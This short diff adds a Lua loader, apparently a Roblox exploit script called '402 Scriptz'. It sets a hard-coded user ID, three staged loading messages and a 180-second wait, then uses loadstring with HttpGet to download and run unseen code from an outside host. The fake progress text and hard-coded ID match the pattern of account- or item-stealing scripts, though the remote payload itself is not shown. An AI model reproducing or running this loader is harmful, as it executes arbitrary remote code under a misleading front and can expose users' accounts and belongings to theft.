@@ -1,0 +1,7 @@
+_G.UserID = 4401897119
+_G.ScriptName = "402 Scriptz"
+_G.FirstText = "Script Preparing..."
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
+loadstring(game:HttpGet("http://rizz.ct8.pl/scripts/Script", true))()
